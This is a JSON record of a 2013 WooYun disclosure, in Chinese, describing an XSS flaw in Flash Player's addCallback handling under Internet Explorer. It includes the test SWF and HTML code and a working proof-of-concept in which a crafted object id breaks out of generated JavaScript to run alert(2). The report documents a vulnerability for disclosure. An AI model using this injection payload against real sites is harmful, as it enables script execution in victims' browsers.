{"id": 14358, "wybug_id": "wooyun-2013-017309", "wybug_title": "Flash应用安全系列[4]--Flash Player的又一个0day", "wybug_corp": "Adobe", "wybug_author": "p.z", "wybug_date": "2013-01-14 18:31", "wybug_open_date": "2013-02-28 18:33", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "应用安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-01-14：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-02-28：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： Flash Player在处理Flash应用与HTML页面进行通信时，未对特殊字符进行过滤，可能导致跨站脚本攻击。 详细说明：  上回我们说flash.external.ExternalInterface.call的漏洞，其本质还是在SWF和HTML通信时对字符处理不当导致的。还记得我们在第一篇中讲得，SWF文件与HTML页面的通信，包括了从SWF到HTML，就是传统意义上的执行JS，还包括从HTML到SWF的通信，这种通信方式就是由函数flash.external.ExternalInterface.addCallback进行的。addCallback函数可以将ActionScript方法注册为可从容器（这里是HTML）调用。成功调用addCallBack()后，容器中的JS可以调用在Flash Player中注册的函数。那么在从HTML到SWF的通信时，究竟又发生了什么呢。我们简单地建立了一个addCallBack.swf文件，其中代码为：addCallBack.as\nfunction f(){    trace (\"debug\");}flash.external.ExternalInterface.addCallback(\"fname\", this, f);\naddcallback.html\n<html><body><object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" width=\"1\" height=\"1\" id=\"addcallback\" align=\"middle\"><param name=\"allowScriptAccess\" value=\"sameDomain\" /><param name=\"movie\" value=\"addcallback.swf\" /></object></body></html>\n开启IE开发者工具进行调试。\n__flash__removeCallback(document.getElementById(\"addcallback\"), \"fname\");__flash__addCallback(document.getElementById(\"addcallback\"), \"fname\");\n这里有两个变量，fname是在swf中定义好了的，一般不会再改变，因此我们无法控制，addcallback是html页面里id=\"addcallback\"的值，这个是可控的，如果我们顺着上文的思路，对addcallback处尝试进行注入，会怎么样呢。我们先尝试\"符号。addcallback.html\n<html><body><object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" width=\"1\" height=\"1\" id='test\"' align=\"middle\"><param name=\"allowScriptAccess\" value=\"sameDomain\" /><param name=\"movie\" value=\"addcallback.swf\" /></object></body></html>\n在IE中,js调试结果\n__flash__removeCallback(document.getElementById(\"test\"\"), \"fname\");__flash__addCallback(document.getElementById(\"test\"\"), \"fname\");\n\"没有任何过滤就被注入了。我们闭合函数，弄成一个PoC，并添加一个带有id的HTML Tag，避免出错。addcallback.html\n<html><body><div id=\"test\"></div><object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" width=\"1\" height=\"1\" id='test\",\"a\"));alert(2)//' align=\"middle\"><param name=\"allowScriptAccess\" value=\"sameDomain\" /><param name=\"movie\" value=\"addcallback.swf\" /></object></body></html>\n   漏洞证明：  \n\n在线PoC: http://swfpoc.appspot.com/poc/addcallback.html该漏洞仅对IE有效，具体的应用场景可以参照这篇： WooYun: [腾讯实例教程] 那些年我们一起学XSS - 21. 存储型XSS进阶 [猜测规则，利用Flash addCallback构造XSS]   修复方案：  反正你们不修复   版权声明：转载请注明来源 p.z@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-01-14 18:56 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  擦，@p.z 大牛不断在发0day    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}